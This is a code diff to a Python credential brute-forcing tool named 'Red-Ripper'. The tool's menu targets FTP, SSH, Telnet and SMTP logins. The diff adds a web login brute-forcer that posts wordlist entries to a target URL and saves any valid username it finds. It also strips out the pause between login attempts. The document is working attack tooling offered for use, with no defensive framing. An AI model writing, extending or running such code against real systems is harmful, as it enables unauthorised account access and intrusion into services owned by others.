@@ -245,41 +245,33 @@ while True:
         print(Fore.MAGENTA + "[2] SSH Attack")
         print(Fore.MAGENTA + "[3] Telnet Attack")
         print(Fore.MAGENTA + "[4] SMTP Attack")
-        print("[5] Return\n")
+        print(Fore.RED + "[5] Admin Panel or Login Brute Force")
+        print("[6] Return\n")
 
         def load_list(value):
             value = value.strip()
             if not value:
-                print("INVALID WORDLIST OR INPUT.")
-                sys.exit(1)
+                print("INVALID WORDLIST.")
+                raw_input("Press Enter to return...")
+                return []
 
             if os.path.isfile(value):
                 if os.path.getsize(value) == 0:
-                    print("Wordlist is empty.")
+                    print("Wordlist empty.")
                     sys.exit(1)
 
-                items = []
                 try:
-                    f = open(value, "r")
-                    for line in f:
-                        stripped = line.strip()
-                        if stripped:
-                            items.append(stripped)
-                    f.close()
+                    with open(value, "r") as f:
+                        items = [line.strip() for line in f if line.strip()]
+                    if not items:
+                        print("Wordlist empty.")
+                        sys.exit(1)
+                    return items
                 except:
                     print("Cannot read wordlist.")
                     sys.exit(1)
 
-                if len(items) == 0:
-                    print("Wordlist is empty.")
-                    sys.exit(1)
-
-                return items
-
             return [value]
-
-        SUCCESS_FILE = "success_log.txt"
-        DELAY_BETWEEN_ATTEMPTS = 0.75
 
         def perform_ftp_attack(target_ip, ftp_port, user, passwd):
             ftp_commands = "user {} {}\nquit\n".format(user, passwd)
@@ -330,16 +322,84 @@ while True:
             proc = subprocess.call(smtp_command)
             return proc
 
+        def perform_web_attack():
+            os.system("clear")
+            print(Fore.RED + RedRipper)
+            print(Fore.RED + barrier)
+            print(Fore.MAGENTA + "           |WEB LOGIN CREDENTIAL RIPPER|\n")
+
+            try:
+                URL = raw_input(Fore.CYAN + "Enter Target URL: ").strip()
+                VALID = raw_input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
+                FIELD = raw_input(Fore.CYAN + "Enter Field Name: ").strip()
+                WORDLIST = raw_input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
+                FAIL = raw_input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
+                OUTPUT = raw_input(Fore.CYAN + "Enter Output File (success.txt): ").strip()
+
+                try:
+                    words = open(WORDLIST, "r").read().splitlines()
+                except Exception as e:
+                    print(Fore.RED + "ERROR reading wordlist: {}".format(e))
+                    raw_input("Press Enter...")
+                    return
+
+                print(Fore.MAGENTA + "\nRIPPING CREDENTIALS...\n")
+                open(OUTPUT, "a").close()
+
+                for user in words:
+                    print(Fore.YELLOW + "Trying username: {}".format(user))
+
+                    if VALID == "":
+                        data = {FIELD: user}
+                    else:
+                        data = {
+                            "username": VALID,
+                            FIELD: user
+                        }
+
+                    try:
+                        r = requests.post(URL, data=data, timeout=10)
+                    except requests.exceptions.Timeout:
+                        print(Fore.RED + "[ERROR] Timeout, skipping:", user)
+                        continue
+                    except requests.exceptions.ConnectionError:
+                        print(Fore.RED + "[ERROR] Connection lost.")
+                        raw_input("Press Enter...")
+                        return
+                    except Exception as e:
+                        print(Fore.RED + "[ERROR] Unexpected:", e)
+                        continue
+
+                    if FAIL not in r.text:
+                        print(Fore.GREEN + "\n[VALID USERNAME FOUND] -> " + user)
+                        try:
+                            with open(OUTPUT, "w") as out:
+                                out.write(user + "\n")
+                        except:
+                            print(Fore.RED + "[ERROR] Cannot write output file.")
+                        raw_input("\nPress Enter...")
+                        return
+                    else:
+                        print(Fore.RED + "[INVALID] " + user)
+
+                print(Fore.RED + "\nBruteforce complete. No valid username found.")
+                raw_input("Press Enter...")
+
+            except KeyboardInterrupt:
+                print(Fore.YELLOW + "\nStopped by user.")
+                raw_input("Press Enter...")
+                return
+
         def perform_attack(target_type):
             os.system("clear")
             print(Fore.RED + RedRipper)
             print(Fore.RED + barrier)
-            print(Fore.MAGENTA + "                |{} CREDENTIAL RIPPER|\n".format(target_type))
+            print(Fore.MAGENTA + "       |{} CREDENTIAL RIPPER|\n".format(target_type))
 
             target_ip = raw_input(Fore.RED + "Enter Target IP: ")
             target_port = raw_input(Fore.RED + "Enter {} Port: ".format(target_type))
-            username_input = raw_input(Fore.CYAN + "Enter Username/Username Wordlist: ")
-            password_input = raw_input(Fore.CYAN + "Enter Password Wordlist (.txt): ")
+            username_input = raw_input(Fore.CYAN + "Enter Username Wordlist: ")
+            password_input = raw_input(Fore.CYAN + "Enter Password Wordlist: ")
 
             usernames = load_list(username_input)
             passwords = load_list(password_input)
@@ -361,43 +421,37 @@ while True:
                         print("Unknown target type.")
                         return
 
-                    print("Trying {} login - User: {}, Password: {}".format(target_type, user, passwd))
+                    print("Trying {} - {} : {}".format(target_type, user, passwd))
                     retcode = attack_command()
 
                     if retcode == 0:
-                        print("\033[32mAttack Success: IP: {}, Username: {}, Password: {}\033[0m"
-                              .format(target_ip, user, passwd))
-                        sf = open(success_file, "a")
-                        sf.write("IP: {}, Username: {}, Password: {}\n".format(target_ip, user, passwd))
-                        sf.close()
-
-                        time.sleep(2)
-                        exit_option = raw_input("Exit or Continue? [E/C]: ")
-                        if exit_option.lower() == "e":
-                            print("Exiting Red-Ripper.")
+                        print(Fore.GREEN + "SUCCESS: {} {} {}".format(target_ip, user, passwd))
+                        with open(success_file, "a") as sf:
+                            sf.write("IP: {}, User: {}, Pass: {}\n".format(target_ip, user, passwd))
+                        ex = raw_input("Exit or Continue? [E/C]: ").lower()
+                        if ex == "e":
                             return
                     else:
-                        print("\033[31m UNSUCCESSFUL ATTEMPT: User: {}, Password: {}\033[0m".format(user, passwd))
+                        print(Fore.RED + "FAILED: {} {}".format(user, passwd))
 
-                    time.sleep(DELAY_BETWEEN_ATTEMPTS)
-
-                print("{} Attack Completed.".format(target_type))
-                raw_input("Press Enter")
+            raw_input("Press Enter...")
 
         choice = raw_input(Fore.GREEN + "Option > ")
 
         if choice == "1":
             perform_attack("FTP")
-        if choice == "2":
+        elif choice == "2":
             perform_attack("SSH")
-        if choice == "3":
+        elif choice == "3":
             perform_attack("Telnet")
-        if choice == "4":
+        elif choice == "4":
             perform_attack("SMTP")
-        if choice == "5":
-            raw_input(" Press Enter to return to menu...")
+        elif choice == "5":
+            perform_web_attack()
+        elif choice == "6":
+            raw_input("Press Enter to return...")
         else:
-            raw_input("Invalid choice. Press Enter.")
+            raw_input("Invalid choice. Press Enter...")
 
     if x == "0":
         print("Exiting...")
